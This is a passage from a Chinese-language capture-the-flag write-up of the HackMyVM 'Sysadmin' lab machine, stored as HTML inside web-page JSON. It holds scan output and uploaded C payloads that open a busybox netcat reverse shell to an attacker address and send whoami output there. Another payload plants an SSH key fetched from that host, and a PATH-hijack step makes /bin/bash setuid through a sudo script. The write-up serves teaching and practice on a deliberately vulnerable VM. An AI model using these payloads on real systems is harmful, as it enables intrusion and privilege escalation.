n class=\"hljs-number\"\u003e7.2\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e7.5\u003c/span\u003e (Linux \u003cspan class=\"hljs-number\"\u003e5.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e)\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e0.50\u003c/span\u003e ms \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.210\u003c/span\u003e\n\nOS \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Service detection performed. Please report \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e incorrect results at https://nmap.org/submit/ .\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e21.64\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e80\u003c/code\u003e 端口，看样子是文件上传，并且是让我们上传 \u003ccode\u003eC\u003c/code\u003e 语言文件，并且会运行\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSysadmin/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e端口扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  sysadmin feroxbuster --url http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.210\u003c/span\u003e -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt --\u003cspan class=\"hljs-built_in\"\u003efilter\u003c/span\u003e-status \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e503\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e400\u003c/span\u003e -x php,txt\n\n                                                                                                                                    \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \u003cspan class=\"hljs-string\"\u003e\"epi\"\u003c/span\u003e Risher 🤓                 ver: \u003cspan class=\"hljs-number\"\u003e2.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.210\u003c/span\u003e\n 🚀  Threads               │ \u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt\n 💢  Status Code Filters   │ [\u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e503\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e400\u003c/span\u003e]\n 💥  Timeout (secs)        │ \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e\n 🦡  User-Agent            │ feroxbuster/\u003cspan class=\"hljs-number\"\u003e2.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ true\n 💲  Extensions            │ [php, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n\u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e      GET        \u003cspan class=\"hljs-number\"\u003e9l\u003c/span\u003e       31w      276c Auto-filtering found \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e-like response \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e created new \u003cspan class=\"hljs-built_in\"\u003efilter\u003c/span\u003e; toggle off \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e --dont-\u003cspan class=\"hljs-built_in\"\u003efilter\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e      GET        \u003cspan class=\"hljs-number\"\u003e9l\u003c/span\u003e       28w      279c Auto-filtering found \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e-like response \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e created new \u003cspan class=\"hljs-built_in\"\u003efilter\u003c/span\u003e; toggle off \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e --dont-\u003cspan class=\"hljs-built_in\"\u003efilter\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e      GET       \u003cspan class=\"hljs-number\"\u003e59l\u003c/span\u003e      156w     2384c http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.210\u003c/span\u003e/index.php\n\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e      GET       \u003cspan class=\"hljs-number\"\u003e59l\u003c/span\u003e      156w     2384c http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.210\u003c/span\u003e/\n[\u003cspan class=\"hljs-comment\"\u003e####################] - 50s   661641/661641  0s      found:2       errors:1      \u003c/span\u003e\n[\u003cspan class=\"hljs-comment\"\u003e####################] - 50s   661635/661635  13173/s http://192.168.56.210/\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eF12 查看源码时发现\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSysadmin/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRCE\u003c/h2\u003e\n\u003cp\u003e这里的猜测是，上传 c 文件后，然后通过上边的语句进行编译然后运行，但是编译语句中带有 \u003ccode\u003e-nostdinc\u003c/code\u003e 不使用默认系统库函数及不搜索默认头文件路径，所以我们无法直接导入 \u003ccode\u003estdio.h\u003c/code\u003e 等，需要绕过\u003c/p\u003e\n\u003cp\u003e通过使用内联函数定义，要在不依赖 \u003ccode\u003estdlib.h\u003c/code\u003e 的情况下调用 system，您可以手动声明它：\u003c/p\u003e\n\u003cp\u003e测试一下是否存在RCE\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e system(const char *command);\n\u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e main() {\n    system(\u003cspan class=\"hljs-string\"\u003e\"busybox nc 192.168.56.5 1234\"\u003c/span\u003e); // Attempt to spawn a shell\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e存在 RCE\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSysadmin/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e system(const char *command);\n\u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e main() {\n    system(\u003cspan class=\"hljs-string\"\u003e\"busybox nc 192.168.56.5 1234 -e /bin/bash\"\u003c/span\u003e); // Attempt to spawn a shell\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是连上连上不到一会就断掉了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSysadmin/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试写公钥，首先获取用户名\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e system(const char *command);\n\u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e main() {\n    system(\u003cspan class=\"hljs-string\"\u003e\"echo $(whoami) | busybox nc 192.168.56.5 80\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到用户名 \u003ccode\u003eecho\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSysadmin/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e写公钥\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# Kali\u003c/span\u003e\ncat ~/.ssh/authorized_keys \u003e  authorized_keys\npython -m http.server \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e  \nServing HTTP on \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e port \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e (http://\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/) ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e system(const char *command);\n\u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e main() {\n    system(\u003cspan class=\"hljs-string\"\u003e\"mkdir -p ~/.ssh \u0026#x26;\u0026#x26; busybox wget 192.168.56.5/authorized_keys -O ~/.ssh/authorized_keys\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSysadmin/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e通过私钥进行登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSysadmin/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进去后能读 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eecho@Sysadmin:~$ cat user.txt \nflag{user-9592f6e02a7abaf9e38c0ef43e868cf3}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e命令劫持\u003c/h2\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eecho@Sysadmin:~$ sudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e echo on Sysadmin:\n    !env_reset, mail_badpass, !env_reset, always_set_home\n\nUser echo may run the following commands on Sysadmin:\n    (root) NOPASSWD: /usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/system-info.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中 \u003ccode\u003e!env_reset\u003c/code\u003e 可能存在路径劫持\u003c/p\u003e\n\u003cp\u003e查看脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eecho@Sysadmin:~$ cat /usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/system-info.sh\n\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e#===================================\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# Daily System Info Report\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#===================================\u003c/span\u003e\n\necho \u003cspan class=\"hljs-string\"\u003e\"Starting daily system information collection at $(date)\"\u003c/span\u003e\necho \u003cspan class=\"hljs-string\"\u003e\"------------------------------------------------------\"\u003c/span\u003e\n\necho \u003cspan class=\"hljs-string\"\u003e\"Checking disk usage...\"\u003c/span\u003e\ndf -h\n\necho \u003cspan class=\"hljs-string\"\u003e\"Checking log directory...\"\u003c/span\u003e\nls -lh /var/log/\nfind /var/log/ -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f -name \u003cspan class=\"hljs-string\"\u003e\"*.gz\"\u003c/span\u003e -mtime +\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e -\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e rm {} \\;\n\necho \u003cspan class=\"hljs-string\"\u003e\"Checking critical services...\"\u003c/span\u003e\nsystemctl \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e-active sshd\nsystemctl \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e-active cron\n\necho \u003cspan class=\"hljs-string\"\u003e\"Collecting CPU and memory information...\"\u003c/span\u003e\ncat /proc/cpuinfo\nfree -m\n\necho \u003cspan class=\"hljs-string\"\u003e\"------------------------------------------------------\"\u003c/span\u003e\necho \u003cspan class=\"hljs-string\"\u003e\"Report complete at $(date)\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到很多可以劫持的命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eecho@Sysadmin:~$ echo \u003cspan class=\"hljs-string\"\u003e\"chmod +s /bin/bash\"\u003c/span\u003e \u003e /tmp/df\necho@Sysadmin:~$ chmod +x /tmp/df\necho@Sysadmin:~$ export PATH=\u003cspan class=\"hljs-string\"\u003e\"/tmp:$PATH\"\u003c/span\u003e\necho@Sysadmin:~$ sudo /usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/system-info.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSysadmin/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e","title":"HackMyVM - Sysadmin","date":"2025-10-25","updated":"2025-10-25","tags":["HackMyVM","Linux","RCE","Hijack","Path_Hijack"],"categories":"靶机","comments":true,"description":"Sysadmin. https://hackmyvm.eu/machines/machine.php?vm=Sysadmin Recon PortScan 枚举 80 端口，看样子是文件上传，并且是让我们上传 C 语言文件，并且会运行 端口扫描 F12 查看源码时发现 RCE 这里的猜测是，上传 c..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMSysadmin"},"buildId":"88HS9mtGKBYYdCm8EXeaK","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
